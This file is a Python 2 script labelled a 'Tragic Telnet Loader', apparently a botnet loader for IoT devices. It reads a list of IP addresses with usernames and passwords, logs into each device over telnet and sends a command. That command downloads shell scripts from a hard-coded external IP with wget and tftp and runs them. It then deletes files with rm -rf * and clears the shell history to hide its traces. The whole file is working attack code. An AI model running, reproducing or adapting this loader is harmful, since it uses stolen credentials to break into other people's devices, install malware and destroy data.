#!/usr/bin/python
# Tragic Telnet Loader

import sys, re, os, socket, time
from threading import Thread

if len(sys.argv) < 2:
	sys.exit("\033[37mUsage: python "+sys.argv[0]+" [list]")

cmd="cd /tmp || cd /run || cd /; wget http://20.213.158.30/obas!.sh; chmod 777 obas!.sh; sh obas!.sh Cipher; tftp 20.213.158.30 -c get obas!tftp1.sh; chmod 777 obas!tftp1.sh; sh obas!tftp1.sh Cipher; tftp -r obas!tftp2.sh -g 20.213.158.30; chmod 777 obas!tftp2.sh; sh obas!tftp2.sh Cipher; rm -rf obas!.sh obas!tftp1.sh obas!tftp2.sh; rm -rf *;history -c" #Payload Goes Here, Example: Payload Goes In Between The ---> ""
info = open(str(sys.argv[1]),'a+')

def sqwad(ip,username,password):
	ip = str(ip).rstrip("\n")
	username = username.rstrip("\n")
	password = password.rstrip("\n")
	try:
		tn = socket.socket()
		tn.settimeout(5)
		tn.connect((ip,23))
	except Exception:
		print "\033[31m[\033[31m+\033[31m] \033[31mFailed To Connect!\033[31m %s"%(ip)
		tn.close()
	try:
		hoho = ''
		hoho += readUntil(tn, "ogin")
		if "ogin" in hoho:
			tn.send(username + "\n")
			print "\033[33m[\033[33m+\033[33m] \033[90mSending Username!\033[33m %s"%(ip)
			time.sleep(0.09)
		else:
			pass
	except Exception:
		tn.close()
	try:
		hoho = ''
		hoho += readUntil(tn, "assword:")
		if "assword" in hoho:
			tn.send(password + "\n")
			print "\033[33m[\033[33m+\033[33m] \033[90mSending Password!\033[33m %s"%(ip)
			time.sleep(2)
		else:
			pass
	except Exception:
		tn.close()
	try:
		tn.send("sh" + "\n")
		time.sleep(0.05)
		tn.send(cmd + "\n")
		print "\033[32m[\033[32m+\033[32m] \033[32mCommand Sent!\033[32m %s"%(ip) #False possitives because thats what yall wanted lmao
		time.sleep(15)
		tn.close()
	except Exception:
		tn.close()

def readUntil(tn, string, timeout=8):
	buf = ''
	start_time = time.time()
	while time.time() - start_time < timeout:
		buf += tn.recv(1024)
		time.sleep(0.01)
		if string in buf: return buf
	raise Exception('TIMEOUT!')

for x in info:
	try:
		if ":23 " in x:
			x = x.replace(":23 ", ":")
		xinfo = x.split(":")
		session = Thread(target=sqwad, args=(xinfo[0].rstrip("\n"),xinfo[1].rstrip("\n"),xinfo[2].rstrip("\n"),))
		session.start()
		ip=xinfo[0]
		username=xinfo[1]
		password=xinfo[2]
		time.sleep(0.01)
	except:
		pass